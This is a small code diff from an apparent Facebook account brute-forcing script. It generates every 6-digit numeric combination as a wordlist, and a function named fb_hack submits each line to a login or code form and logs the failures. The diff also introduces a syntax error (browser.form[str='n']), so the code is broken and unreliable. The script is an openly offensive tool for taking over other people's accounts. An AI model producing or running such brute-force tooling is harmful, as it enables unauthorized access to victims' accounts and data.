@@ -45,7 +45,7 @@ def passc():
   except:
     f = open("6digits.txt", "a+")
     for combination in itertools.product(range(10), repeat=6):
-        f.write(''.join(map(str, combination)))
+      f.write(''.join(map(str, combination)))
   try:
     z = open("8digits.txt", "a")
     z.close()
@@ -85,7 +85,7 @@ def fb_hack(email, codex):
       y = f.readlines(attempt)
       attempt += 1
       try:
-        browser.form['n'] = y
+        browser.form[str='n'] = y
         browser.submit()
         print(y, end='\r')
         fail = (y, "failed")
